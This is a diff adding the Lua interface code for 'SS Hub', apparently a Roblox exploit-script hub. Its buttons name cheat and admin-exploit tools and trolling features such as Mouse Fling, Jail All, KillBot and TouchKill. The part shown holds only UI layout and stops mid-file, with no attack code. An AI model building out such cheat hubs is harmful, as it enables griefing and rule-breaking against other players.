@@ -1,0 +1,2310 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = {
+	ScreenGui = Instance.new("ScreenGui"),
+	Frame = Instance.new("Frame"),
+	TextLabel = Instance.new("TextLabel"),
+	UICorner = Instance.new("UICorner"),
+	UICorner_2 = Instance.new("UICorner"),
+	TextLabel_2 = Instance.new("TextLabel"),
+	UICorner_3 = Instance.new("UICorner"),
+	Scripts = Instance.new("TextButton"),
+	UICorner_4 = Instance.new("UICorner"),
+	FeScripts = Instance.new("TextButton"),
+	UICorner_5 = Instance.new("UICorner"),
+	Hubs = Instance.new("TextButton"),
+	UICorner_6 = Instance.new("UICorner"),
+	Credits = Instance.new("TextButton"),
+	UICorner_7 = Instance.new("UICorner"),
+	TextLabel_3 = Instance.new("TextLabel"),
+	UICorner_8 = Instance.new("UICorner"),
+	scriptsframe = Instance.new("Frame"),
+	UICorner_9 = Instance.new("UICorner"),
+	TextLabel_4 = Instance.new("TextLabel"),
+	UICorner_10 = Instance.new("UICorner"),
+	mousefling = Instance.new("TextButton"),
+	UICorner_11 = Instance.new("UICorner"),
+	JailAll = Instance.new("TextButton"),
+	UICorner_12 = Instance.new("UICorner"),
+	InfiniteYield = Instance.new("TextButton"),
+	UICorner_13 = Instance.new("UICorner"),
+	CMDX = Instance.new("TextButton"),
+	UICorner_14 = Instance.new("UICorner"),
+	FatesAdmin = Instance.new("TextButton"),
+	UICorner_15 = Instance.new("UICorner"),
+	GoldenRadio = Instance.new("TextButton"),
+	UICorner_16 = Instance.new("UICorner"),
+	GABXV2 = Instance.new("TextButton"),
+	UICorner_17 = Instance.new("UICorner"),
+	SitWalk = Instance.new("TextButton"),
+	UICorner_18 = Instance.new("UICorner"),
+	fescriptsframe = Instance.new("Frame"),
+	UICorner_19 = Instance.new("UICorner"),
+	ScrollingFrame = Instance.new("ScrollingFrame"),
+	TextLabel_5 = Instance.new("TextLabel"),
+	UICorner_20 = Instance.new("UICorner"),
+	Sonic = Instance.new("TextButton"),
+	UICorner_21 = Instance.new("UICorner"),
+	Gale = Instance.new("TextButton"),
+	UICorner_22 = Instance.new("UICorner"),
+	AmongUs = Instance.new("TextButton"),
+	UICorner_23 = Instance.new("UICorner"),
+	KillBot = Instance.new("TextButton"),
+	UICorner_24 = Instance.new("UICorner"),
+	NekoMaid = Instance.new("TextButton"),
+	UICorner_25 = Instance.new("UICorner"),
+	SmugDance = Instance.new("TextButton"),
+	UICorner_26 = Instance.new("UICorner"),
+	ShadowBlade = Instance.new("TextButton"),
+	UICorner_27 = Instance.new("UICorner"),
+	FishingRod = Instance.new("TextButton"),
+	UICorner_28 = Instance.new("UICorner"),
+	SwordStand = Instance.new("TextButton"),
+	UICorner_29 = Instance.new("UICorner"),
+	NeptunionV = Instance.new("TextButton"),
+	UICorner_30 = Instance.new("UICorner"),
+	RbNeptunion = Instance.new("TextButton"),
+	UICorner_31 = Instance.new("UICorner"),
+	Wall = Instance.new("TextButton"),
+	UICorner_32 = Instance.new("UICorner"),
+	AchromaticGlitcher = Instance.new("TextButton"),
+	UICorner_33 = Instance.new("UICorner"),
+	FlamingCube = Instance.new("TextButton"),
+	UICorner_34 = Instance.new("UICorner"),
+	Spider = Instance.new("TextButton"),
+	UICorner_35 = Instance.new("UICorner"),
+	Cop = Instance.new("TextButton"),
+	UICorner_36 = Instance.new("UICorner"),
+	Chips = Instance.new("TextButton"),
+	UICorner_37 = Instance.new("UICorner"),
+	Joy = Instance.new("TextButton"),
+	UICorner_38 = Instance.new("UICorner"),
+	UltimateMemeDance = Instance.new("TextButton"),
+	UICorner_39 = Instance.new("UICorner"),
+	Chill = Instance.new("TextButton"),
+	UICorner_40 = Instance.new("UICorner"),
+	WallWalk = Instance.new("TextButton"),
+	UICorner_41 = Instance.new("UICorner"),
+	Grapple = Instance.new("TextButton"),
+	UICorner_42 = Instance.new("UICorner"),
+	KrystalDance = Instance.new("TextButton"),
+	UICorner_43 = Instance.new("UICorner"),
+	Stand = Instance.new("TextButton"),
+	UICorner_44 = Instance.new("UICorner"),
+	ServerAdmin = Instance.new("TextButton"),
+	UICorner_45 = Instance.new("UICorner"),
+	BanHammer = Instance.new("TextButton"),
+	UICorner_46 = Instance.new("UICorner"),
+	ParkourGod = Instance.new("TextButton"),
+	UICorner_47 = Instance.new("UICorner"),
+	Sniper = Instance.new("TextButton"),
+	UICorner_48 = Instance.new("UICorner"),
+	Ender = Instance.new("TextButton"),
+	UICorner_49 = Instance.new("UICorner"),
+	VrSword = Instance.new("TextButton"),
+	UICorner_50 = Instance.new("UICorner"),
+	Caducus = Instance.new("TextButton"),
+	UICorner_51 = Instance.new("UICorner"),
+	ElioBlasio = Instance.new("TextButton"),
+	UICorner_52 = Instance.new("UICorner"),
+	Minigun = Instance.new("TextButton"),
+	UICorner_53 = Instance.new("UICorner"),
+	Car = Instance.new("TextButton"),
+	UICorner_54 = Instance.new("UICorner"),
+	Carnage = Instance.new("TextButton"),
+	UICorner_55 = Instance.new("UICorner"),
+	SegsDoll = Instance.new("TextButton"),
+	UICorner_56 = Instance.new("UICorner"),
+	Memeus = Instance.new("TextButton"),
+	UICorner_57 = Instance.new("UICorner"),
+	Pen = Instance.new("TextButton"),
+	UICorner_58 = Instance.new("UICorner"),
+	Xester = Instance.new("TextButton"),
+	UICorner_59 = Instance.new("UICorner"),
+	Broomstick = Instance.new("TextButton"),
+	UICorner_60 = Instance.new("UICorner"),
+	Headless = Instance.new("TextButton"),
+	UICorner_61 = Instance.new("UICorner"),
+	HeadHold = Instance.new("TextButton"),
+	UICorner_62 = Instance.new("UICorner"),
+	Goopie = Instance.new("TextButton"),
+	UICorner_63 = Instance.new("UICorner"),
+	OrangeJustice = Instance.new("TextButton"),
+	UICorner_64 = Instance.new("UICorner"),
+	Floss = Instance.new("TextButton"),
+	UICorner_65 = Instance.new("UICorner"),
+	DistractDance = Instance.new("TextButton"),
+	UICorner_66 = Instance.new("UICorner"),
+	RussainKick = Instance.new("TextButton"),
+	UICorner_67 = Instance.new("UICorner"),
+	InsanityPowers = Instance.new("TextButton"),
+	UICorner_68 = Instance.new("UICorner"),
+	Zen = Instance.new("TextButton"),
+	UICorner_69 = Instance.new("UICorner"),
+	HellRobotics = Instance.new("TextButton"),
+	UICorner_70 = Instance.new("UICorner"),
+	Pillow = Instance.new("TextButton"),
+	UICorner_71 = Instance.new("UICorner"),
+	Pp = Instance.new("TextButton"),
+	UICorner_72 = Instance.new("UICorner"),
+	RainbowKing = Instance.new("TextButton"),
+	UICorner_73 = Instance.new("UICorner"),
+	TouchKill = Instance.new("TextButton"),
+	UICorner_74 = Instance.new("UICorner"),
+	TakeTheL = Instance.new("TextButton"),
+	UICorner_75 = Instance.new("UICorner"),
+	BlackHole = Instance.new("TextButton"),
+	UICorner_76 = Instance.new("UICorner"),
+	JhonDoe = Instance.new("TextButton"),
+	UICorner_77 = Instance.new("UICorner"),
+	Neko = Instance.new("TextButton"),
+	UICorner_78 = Instance.new("UICorner"),
+	Boobs = Instance.new("TextButton"),
+	UICorner_79 = Instance.new("UICorner"),
+	Rtx = Instance.new("TextButton"),
+	UICorner_80 = Instance.new("UICorner"),
+	VR = Instance.new("TextButton"),
+	UICorner_81 = Instance.new("UICorner"),
+	Gun = Instance.new("TextButton"),
+	UICorner_82 = Instance.new("UICorner"),
+	Titain = Instance.new("TextButton"),
+	UICorner_83 = Instance.new("UICorner"),
+	PixelCar = Instance.new("TextButton"),
+	UICorner_84 = Instance.new("UICorner"),
+	hubsframe = Instance.new("Frame"),
+	UICorner_85 = Instance.new("UICorner"),
+	TextLabel_6 = Instance.new("TextLabel"),
+	UICorner_86 = Instance.new("UICorner"),
+	c00lkiddguiv2 = Instance.new("TextButton"),
+	UICorner_87 = Instance.new("UICorner"),
+	c00lkiddguiv1 = Instance.new("TextButton"),
+	UICorner_88 = Instance.new("UICorner"),
+	LostPoint = Instance.new("TextButton"),
+	UICorner_89 = Instance.new("UICorner"),
+	SniffHub = Instance.new("TextButton"),
+	UICorner_90 = Instance.new("UICorner"),
+	MrDestroyerHub = Instance.new("TextButton"),
+	UICorner_91 = Instance.new("UICorner"),
+	MrDestroyerHubv2 = Instance.new("TextButton"),
+	UICorner_92 = Instance.new("UICorner"),
+	FlingGui = Instance.new("TextButton"),
+	UICorner_93 = Instance.new("UICorner"),
+	TrollingGui = Instance.new("TextButton"),
+	UICorner_94 = Instance.new("UICorner"),
+	VHub = Instance.new("TextButton"),
+	UICorner_95 = Instance.new("UICorner"),
+	T0PKEKV40 = Instance.new("TextButton"),
+	UICorner_96 = Instance.new("UICorner"),
+	MOONUV10 = Instance.new("TextButton"),
+	UICorner_97 = Instance.new("UICorner"),
+	KZSHuB = Instance.new("TextButton"),
+	UICorner_98 = Instance.new("UICorner"),
+	creditsframe = Instance.new("Frame"),
+	UICorner_99 = Instance.new("UICorner"),
+	TextLabel_7 = Instance.new("TextLabel"),
+	UICorner_100 = Instance.new("UICorner"),
+	TextLabel_8 = Instance.new("TextLabel"),
+	UICorner_101 = Instance.new("UICorner"),
+	TextLabel_9 = Instance.new("TextLabel"),
+	UICorner_102 = Instance.new("UICorner"),
+	TextLabel_10 = Instance.new("TextLabel"),
+	UICorner_103 = Instance.new("UICorner"),
+	TextLabel_11 = Instance.new("TextLabel"),
+	UICorner_104 = Instance.new("UICorner"),
+	TextLabel_12 = Instance.new("TextLabel"),
+	UICorner_105 = Instance.new("UICorner"),
+	HubuKapat = Instance.new("TextButton"),
+	UICorner_106 = Instance.new("UICorner"),
+}
+
+--Properties:
+
+ScreenGui.ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+ScreenGui.Frame.Parent = ScreenGui.ScreenGui
+ScreenGui.Frame.Active = true
+ScreenGui.Frame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.Frame.Position = UDim2.new(0.230684355, 0, 0.184590638, 0)
+ScreenGui.Frame.Size = UDim2.new(0, 473, 0, 377)
+ScreenGui.Frame.Draggable = true
+
+ScreenGui.TextLabel.Parent = ScreenGui.Frame
+ScreenGui.TextLabel.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel.Size = UDim2.new(0, 169, 0, 34)
+ScreenGui.TextLabel.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel.Text = "SS Hub"
+ScreenGui.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel.TextSize = 30.000
+
+ScreenGui.UICorner.Parent = ScreenGui.TextLabel
+
+ScreenGui.UICorner_2.Parent = ScreenGui.Frame
+
+ScreenGui.TextLabel_2.Parent = ScreenGui.Frame
+ScreenGui.TextLabel_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ScreenGui.TextLabel_2.Position = UDim2.new(0, 0, 0.113573395, 0)
+ScreenGui.TextLabel_2.Size = UDim2.new(0, 169, 0, 334)
+ScreenGui.TextLabel_2.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_2.Text = ""
+ScreenGui.TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.TextLabel_2.TextSize = 14.000
+
+ScreenGui.UICorner_3.Parent = ScreenGui.TextLabel_2
+
+ScreenGui.Scripts.Name = "Scripts"
+ScreenGui.Scripts.Parent = ScreenGui.Frame
+ScreenGui.Scripts.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+ScreenGui.Scripts.Position = UDim2.new(0.0529953912, 0, 0.168975055, 0)
+ScreenGui.Scripts.Size = UDim2.new(0, 122, 0, 29)
+ScreenGui.Scripts.Font = Enum.Font.ArialBold
+ScreenGui.Scripts.Text = "Scripts"
+ScreenGui.Scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.Scripts.TextSize = 30.000
+
+ScreenGui.UICorner_4.Parent = ScreenGui.Scripts
+
+ScreenGui.FeScripts.Name = "FeScripts"
+ScreenGui.FeScripts.Parent = ScreenGui.Frame
+ScreenGui.FeScripts.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+ScreenGui.FeScripts.Position = UDim2.new(0.0529953912, 0, 0.313019395, 0)
+ScreenGui.FeScripts.Size = UDim2.new(0, 122, 0, 29)
+ScreenGui.FeScripts.Font = Enum.Font.ArialBold
+ScreenGui.FeScripts.Text = "FE Scripts"
+ScreenGui.FeScripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.FeScripts.TextSize = 23.000
+
+ScreenGui.UICorner_5.Parent = ScreenGui.FeScripts
+
+ScreenGui.Hubs.Name = "Hubs"
+ScreenGui.Hubs.Parent = ScreenGui.Frame
+ScreenGui.Hubs.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+ScreenGui.Hubs.Position = UDim2.new(0.0529953912, 0, 0.459833801, 0)
+ScreenGui.Hubs.Size = UDim2.new(0, 122, 0, 29)
+ScreenGui.Hubs.Font = Enum.Font.ArialBold
+ScreenGui.Hubs.Text = "Hubs"
+ScreenGui.Hubs.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.Hubs.TextSize = 30.000
+
+ScreenGui.UICorner_6.Parent = ScreenGui.Hubs
+
+ScreenGui.Credits.Name = "Credits"
+ScreenGui.Credits.Parent = ScreenGui.Frame
+ScreenGui.Credits.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+ScreenGui.Credits.Position = UDim2.new(0.0529953912, 0, 0.609418273, 0)
+ScreenGui.Credits.Size = UDim2.new(0, 122, 0, 29)
+ScreenGui.Credits.Font = Enum.Font.ArialBold
+ScreenGui.Credits.Text = "Credits"
+ScreenGui.Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.Credits.TextSize = 30.000
+
+ScreenGui.UICorner_7.Parent = ScreenGui.Credits
+
+ScreenGui.TextLabel_3.Parent = ScreenGui.Frame
+ScreenGui.TextLabel_3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ScreenGui.TextLabel_3.Position = UDim2.new(0, 0, 0.898719311, 0)
+ScreenGui.TextLabel_3.Size = UDim2.new(0, 169, 0, 38)
+ScreenGui.TextLabel_3.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_3.Text = "sedat#3034"
+ScreenGui.TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_3.TextSize = 30.000
+
+ScreenGui.UICorner_8.Parent = ScreenGui.TextLabel_3
+
+ScreenGui.scriptsframe.Name = "scriptsframe"
+ScreenGui.scriptsframe.Parent = ScreenGui.Frame
+ScreenGui.scriptsframe.Active = true
+ScreenGui.scriptsframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.scriptsframe.Position = UDim2.new(0.357293874, 0, 0, 0)
+ScreenGui.scriptsframe.Size = UDim2.new(0, 303, 0, 376)
+ScreenGui.scriptsframe.Visible = false
+
+ScreenGui.UICorner_9.Parent = ScreenGui.scriptsframe
+
+ScreenGui.TextLabel_4.Parent = ScreenGui.scriptsframe
+ScreenGui.TextLabel_4.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_4.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_4.Position = UDim2.new(0.165016502, 0, 0, 0)
+ScreenGui.TextLabel_4.Size = UDim2.new(0, 203, 0, 42)
+ScreenGui.TextLabel_4.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_4.Text = "SCRİPTS"
+ScreenGui.TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_4.TextSize = 40.000
+
+ScreenGui.UICorner_10.Parent = ScreenGui.TextLabel_4
+
+ScreenGui.mousefling.Name = "mousefling"
+ScreenGui.mousefling.Parent = ScreenGui.scriptsframe
+ScreenGui.mousefling.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.mousefling.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.mousefling.Position = UDim2.new(0.0330033004, 0, 0.169424459, 0)
+ScreenGui.mousefling.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.mousefling.Font = Enum.Font.SourceSans
+ScreenGui.mousefling.Text = "Mouse Fling"
+ScreenGui.mousefling.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.mousefling.TextSize = 26.000
+
+ScreenGui.UICorner_11.Parent = ScreenGui.mousefling
+
+ScreenGui.JailAll.Name = "JailAll"
+ScreenGui.JailAll.Parent = ScreenGui.scriptsframe
+ScreenGui.JailAll.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.JailAll.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.JailAll.Position = UDim2.new(0.534653425, 0, 0.169424459, 0)
+ScreenGui.JailAll.Size = UDim2.new(0, 130, 0, 29)
+ScreenGui.JailAll.Font = Enum.Font.SourceSans
+ScreenGui.JailAll.Text = "Jail All"
+ScreenGui.JailAll.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.JailAll.TextSize = 26.000
+
+ScreenGui.UICorner_12.Parent = ScreenGui.JailAll
+
+ScreenGui.InfiniteYield.Name = "InfiniteYield"
+ScreenGui.InfiniteYield.Parent = ScreenGui.scriptsframe
+ScreenGui.InfiniteYield.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.InfiniteYield.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.InfiniteYield.Position = UDim2.new(0.0330033004, 0, 0.283786178, 0)
+ScreenGui.InfiniteYield.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.InfiniteYield.Font = Enum.Font.SourceSans
+ScreenGui.InfiniteYield.Text = "Infinite Yield"
+ScreenGui.InfiniteYield.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.InfiniteYield.TextSize = 26.000
+
+ScreenGui.UICorner_13.Parent = ScreenGui.InfiniteYield
+
+ScreenGui.CMDX.Name = "CMDX"
+ScreenGui.CMDX.Parent = ScreenGui.scriptsframe
+ScreenGui.CMDX.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.CMDX.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.CMDX.Position = UDim2.new(0.534653425, 0, 0.283786178, 0)
+ScreenGui.CMDX.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.CMDX.Font = Enum.Font.SourceSans
+ScreenGui.CMDX.Text = "CMD-X"
+ScreenGui.CMDX.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.CMDX.TextSize = 26.000
+
+ScreenGui.UICorner_14.Parent = ScreenGui.CMDX
+
+ScreenGui.FatesAdmin.Name = "FatesAdmin"
+ScreenGui.FatesAdmin.Parent = ScreenGui.scriptsframe
+ScreenGui.FatesAdmin.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.FatesAdmin.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.FatesAdmin.Position = UDim2.new(0.0330032706, 0, 0.408786178, 0)
+ScreenGui.FatesAdmin.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.FatesAdmin.Font = Enum.Font.SourceSans
+ScreenGui.FatesAdmin.Text = "Fates Admin"
+ScreenGui.FatesAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.FatesAdmin.TextSize = 26.000
+
+ScreenGui.UICorner_15.Parent = ScreenGui.FatesAdmin
+
+ScreenGui.GoldenRadio.Name = "GoldenRadio"
+ScreenGui.GoldenRadio.Parent = ScreenGui.scriptsframe
+ScreenGui.GoldenRadio.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.GoldenRadio.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.GoldenRadio.Position = UDim2.new(0.534653425, 0, 0.408786178, 0)
+ScreenGui.GoldenRadio.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.GoldenRadio.Font = Enum.Font.SourceSans
+ScreenGui.GoldenRadio.Text = "Golden Radio"
+ScreenGui.GoldenRadio.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.GoldenRadio.TextSize = 26.000
+
+ScreenGui.UICorner_16.Parent = ScreenGui.GoldenRadio
+
+ScreenGui.GABXV2.Name = "GABXV2"
+ScreenGui.GABXV2.Parent = ScreenGui.scriptsframe
+ScreenGui.GABXV2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.GABXV2.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.GABXV2.Position = UDim2.new(0.0330032706, 0, 0.536445737, 0)
+ScreenGui.GABXV2.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.GABXV2.Font = Enum.Font.SourceSans
+ScreenGui.GABXV2.Text = "GabX V2"
+ScreenGui.GABXV2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.GABXV2.TextSize = 26.000
+
+ScreenGui.UICorner_17.Parent = ScreenGui.GABXV2
+
+ScreenGui.SitWalk.Name = "SitWalk"
+ScreenGui.SitWalk.Parent = ScreenGui.scriptsframe
+ScreenGui.SitWalk.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.SitWalk.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.SitWalk.Position = UDim2.new(0.534653425, 0, 0.536445737, 0)
+ScreenGui.SitWalk.Size = UDim2.new(0, 130, 0, 28)
+ScreenGui.SitWalk.Font = Enum.Font.SourceSans
+ScreenGui.SitWalk.Text = "Sit Walk"
+ScreenGui.SitWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.SitWalk.TextSize = 26.000
+
+ScreenGui.UICorner_18.Parent = ScreenGui.SitWalk
+
+ScreenGui.fescriptsframe.Name = "fescriptsframe"
+ScreenGui.fescriptsframe.Parent = ScreenGui.Frame
+ScreenGui.fescriptsframe.Active = true
+ScreenGui.fescriptsframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.fescriptsframe.Position = UDim2.new(0.357293874, 0, 0, 0)
+ScreenGui.fescriptsframe.Size = UDim2.new(0, 303, 0, 377)
+ScreenGui.fescriptsframe.Visible = false
+
+ScreenGui.UICorner_19.Parent = ScreenGui.fescriptsframe
+
+ScreenGui.ScrollingFrame.Parent = ScreenGui.fescriptsframe
+ScreenGui.ScrollingFrame.Active = true
+ScreenGui.ScrollingFrame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.ScrollingFrame.BorderColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.ScrollingFrame.Position = UDim2.new(0.00330032408, 0, 0.0185676385, 0)
+ScreenGui.ScrollingFrame.Size = UDim2.new(0, 303, 0, 369)
+ScreenGui.ScrollingFrame.CanvasSize = UDim2.new(0, 0, 6, 0)
+
+ScreenGui.TextLabel_5.Parent = ScreenGui.ScrollingFrame
+ScreenGui.TextLabel_5.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+ScreenGui.TextLabel_5.Position = UDim2.new(0.168316826, 0, 0.00411607791, 0)
+ScreenGui.TextLabel_5.Size = UDim2.new(0, 200, 0, 29)
+ScreenGui.TextLabel_5.Font = Enum.Font.SourceSans
+ScreenGui.TextLabel_5.Text = "Fe Scripts"
+ScreenGui.TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenGui.TextLabel_5.TextSize = 30.000
+
+ScreenGui.UICorner_20.Parent = ScreenGui.TextLabel_5
+
+ScreenGui.Sonic.Name = "Sonic"
+ScreenGui.Sonic.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Sonic.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Sonic.Position = UDim2.new(0.0429042913, 0, 0.0234133489, 0)
+ScreenGui.Sonic.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Sonic.Font = Enum.Font.SourceSans
+ScreenGui.Sonic.Text = "Sonic"
+ScreenGui.Sonic.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Sonic.TextSize = 40.000
+
+ScreenGui.UICorner_21.Parent = ScreenGui.Sonic
+
+ScreenGui.Gale.Name = "Gale"
+ScreenGui.Gale.Parent = ScreenGui.ScrollingFrame
+ScreenGui.Gale.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.Gale.Position = UDim2.new(0.521452129, 0, 0.0234133471, 0)
+ScreenGui.Gale.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.Gale.Font = Enum.Font.SourceSans
+ScreenGui.Gale.Text = "Gale"
+ScreenGui.Gale.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.Gale.TextSize = 40.000
+
+ScreenGui.UICorner_22.Parent = ScreenGui.Gale
+
+ScreenGui.AmongUs.Name = "AmongUs"
+ScreenGui.AmongUs.Parent = ScreenGui.ScrollingFrame
+ScreenGui.AmongUs.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.AmongUs.Position = UDim2.new(0.0429042913, 0, 0.0490543768, 0)
+ScreenGui.AmongUs.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.AmongUs.Font = Enum.Font.SourceSans
+ScreenGui.AmongUs.Text = "AmongUs"
+ScreenGui.AmongUs.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.AmongUs.TextSize = 36.000
+
+ScreenGui.UICorner_23.Parent = ScreenGui.AmongUs
+
+ScreenGui.KillBot.Name = "KillBot"
+ScreenGui.KillBot.Parent = ScreenGui.ScrollingFrame
+ScreenGui.KillBot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.KillBot.Position = UDim2.new(0.521452129, 0, 0.0490543768, 0)
+ScreenGui.KillBot.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.KillBot.Font = Enum.Font.SourceSans
+ScreenGui.KillBot.Text = "KillBot"
+ScreenGui.KillBot.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.KillBot.TextSize = 36.000
+
+ScreenGui.UICorner_24.Parent = ScreenGui.KillBot
+
+ScreenGui.NekoMaid.Name = "NekoMaid"
+ScreenGui.NekoMaid.Parent = ScreenGui.ScrollingFrame
+ScreenGui.NekoMaid.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.NekoMaid.Position = UDim2.new(0.0429042876, 0, 0.0755795762, 0)
+ScreenGui.NekoMaid.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.NekoMaid.Font = Enum.Font.SourceSans
+ScreenGui.NekoMaid.Text = "NekoMaid"
+ScreenGui.NekoMaid.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.NekoMaid.TextSize = 36.000
+
+ScreenGui.UICorner_25.Parent = ScreenGui.NekoMaid
+
+ScreenGui.SmugDance.Name = "SmugDance"
+ScreenGui.SmugDance.Parent = ScreenGui.ScrollingFrame
+ScreenGui.SmugDance.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.SmugDance.Position = UDim2.new(0.521452129, 0, 0.0755795762, 0)
+ScreenGui.SmugDance.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.SmugDance.Font = Enum.Font.SourceSans
+ScreenGui.SmugDance.Text = "SmugDance"
+ScreenGui.SmugDance.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.SmugDance.TextSize = 29.000
+
+ScreenGui.UICorner_26.Parent = ScreenGui.SmugDance
+
+ScreenGui.ShadowBlade.Name = "ShadowBlade"
+ScreenGui.ShadowBlade.Parent = ScreenGui.ScrollingFrame
+ScreenGui.ShadowBlade.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.ShadowBlade.Position = UDim2.new(0.0429042615, 0, 0.102546863, 0)
+ScreenGui.ShadowBlade.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.ShadowBlade.Font = Enum.Font.SourceSans
+ScreenGui.ShadowBlade.Text = "ShadowBlade"
+ScreenGui.ShadowBlade.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.ShadowBlade.TextSize = 25.000
+
+ScreenGui.UICorner_27.Parent = ScreenGui.ShadowBlade
+
+ScreenGui.FishingRod.Name = "FishingRod"
+ScreenGui.FishingRod.Parent = ScreenGui.ScrollingFrame
+ScreenGui.FishingRod.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.FishingRod.Position = UDim2.new(0.521452129, 0, 0.102546863, 0)
+ScreenGui.FishingRod.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.FishingRod.Font = Enum.Font.SourceSans
+ScreenGui.FishingRod.Text = "FishingRod"
+ScreenGui.FishingRod.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.FishingRod.TextSize = 30.000
+
+ScreenGui.UICorner_28.Parent = ScreenGui.FishingRod
+
+ScreenGui.SwordStand.Name = "SwordStand"
+ScreenGui.SwordStand.Parent = ScreenGui.ScrollingFrame
+ScreenGui.SwordStand.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ScreenGui.SwordStand.Position = UDim2.new(0.0429042876, 0, 0.129956231, 0)
+ScreenGui.SwordStand.Size = UDim2.new(0, 127, 0, 37)
+ScreenGui.SwordStand.Font = Enum.Font.SourceSans
+ScreenGui.SwordStand.Text = "SwordStand"
+ScreenGui.SwordStand.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreenGui.SwordStand.TextSize = 28.000
+
+ScreenGui.UICorner_29.Parent = ScreenGui.SwordStand
+
+ScreenGui.NeptunionV.Name = "NeptunionV"
+ScreenGui.NeptunionV.Parent = ScreenGui.ScrollingFrame
